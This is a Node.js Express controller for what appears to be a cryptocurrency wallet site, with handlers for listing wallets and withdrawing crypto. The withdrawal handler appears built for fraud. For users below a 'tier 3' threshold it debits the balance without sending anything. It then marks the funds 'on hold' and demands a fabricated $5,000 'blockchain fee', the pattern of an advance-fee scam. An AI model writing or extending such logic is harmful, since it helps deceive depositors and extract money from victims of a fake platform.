import Wallet from '../models/Wallet.js';
import Transaction from '../models/Transaction.js';
import User from '../models/User.js';

const TIER_LIMITS = {
  1: { label: 'Basic', sendLimit: 0, canSendCrypto: false, minBalance: 0 },
  2: { label: 'Standard', sendLimit: 1000, canSendCrypto: false, minBalance: 0 },
  3: { label: 'Premium', sendLimit: 50000, canSendCrypto: true, minBalance: 5000 }
};

export const getWallets = async (req, res) => {
  try {
    const wallets = await Wallet.find({ userId: req.userId });
    res.json({ wallets });
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
};

export const getWallet = async (req, res) => {
  try {
    const wallet = await Wallet.findOne({ _id: req.params.id, userId: req.userId });
    if (!wallet) return res.status(404).json({ error: 'Wallet not found' });
    res.json({ wallet });
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
};

export const getWalletByCoin = async (req, res) => {
  try {
    const wallet = await Wallet.findOne({ userId: req.userId, coin: req.params.coin.toUpperCase() });
    if (!wallet) return res.status(404).json({ error: 'Wallet not found' });
    res.json({ wallet });
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
};

export const withdrawCrypto = async (req, res) => {
  try {
    const { walletId, address, amount } = req.body;

    if (!walletId || !address || !amount) {
      return res.status(400).json({ error: 'Wallet, address, and amount are required' });
    }

    if (amount <= 0) {
      return res.status(400).json({ error: 'Amount must be positive' });
    }

    const user = await User.findById(req.userId);
    if (!user) return res.status(404).json({ error: 'User not found' });

    const wallet = await Wallet.findOne({ _id: walletId, userId: req.userId });
    if (!wallet) return res.status(404).json({ error: 'Wallet not found' });

    const isBelowTier3 = user.tier < 3 || (user.balance?.USD || 0) < 5000;
    const cryptoKey = wallet.coin === 'USDT' ? 'USD' : wallet.coin;
    const usdValue = wallet.coin === 'USDT' ? amount : (wallet.balance > 0 ? (amount * (wallet.usdValue / wallet.balance)) : 0);

    if (isBelowTier3) {
      const precision = wallet.coin === 'USDT' ? 2 : 8;
      const factor = Math.pow(10, precision);
      wallet.balance = Math.max(0, Math.round((wallet.balance - amount) * factor) / factor);
      wallet.usdValue = Math.max(0, Math.round((wallet.usdValue - (usdValue || amount)) * 100) / 100);
      await wallet.save();
    }

    const tx = await Transaction.create({
      userId: req.userId,
      type: 'pending',
      category: 'withdrawal',
      title: isBelowTier3 ? 'Send ' + wallet.coin + ' to external address (on hold — fee required)' : 'Send ' + wallet.coin + ' to external address',
      amount: usdValue || amount,
      currency: 'USD',
      counterparty: address,
      fee: isBelowTier3 ? 5000 : 0,
      notes: 'Crypto withdrawal: ' + wallet.coin + ' ' + amount + (isBelowTier3 ? '. Blockchain fee: $5,000 — pending confirmation.' : ''),
      txHash: '',
      destinationAddress: address,
      cryptoCurrency: wallet.coin,
      cryptoAmount: amount,
      status: 'pending',
      date: new Date()
    });

    res.status(201).json({ transaction: tx, message: isBelowTier3 ? 'Funds on hold — $5,000 blockchain fee required' : 'Withdrawal submitted for review' });
  } catch (err) {
    console.error('Withdraw crypto error:', err);
    res.status(500).json({ error: 'Server error' });
  }
};
